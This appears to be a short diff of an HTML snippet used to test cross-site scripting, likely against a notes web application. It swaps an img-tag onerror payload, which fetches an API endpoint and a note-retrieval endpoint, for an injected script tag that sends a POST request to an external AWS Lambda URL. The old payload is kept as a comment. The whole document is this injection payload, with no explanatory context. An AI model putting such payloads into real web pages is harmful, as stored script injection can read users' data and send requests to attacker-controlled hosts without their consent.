@@ -1,3 +1,6 @@
 <p>hi</p>
-<img src='x' onerror="fetch('https://proxy:8080/api/').then(csrf => {return fetch('https://proxy:8080/api/note/get')}).then(b => {return b.text()}).then(c => console.log(c))"/>
+<script>
+  fetch('https://5mjmnslm7tom4pfcfjow7fexre0isuie.lambda-url.us-east-2.on.aws', {method: 'POST'}).then(a => a.json()).then(a => console.log(a));
+</script>
+<!-- <img src='x' onerror="fetch('https://proxy:8080/api/').then(csrf => {return fetch('https://proxy:8080/api/note/get')}).then(b => {return b.text()}).then(c => console.log(c))"/> -->
 
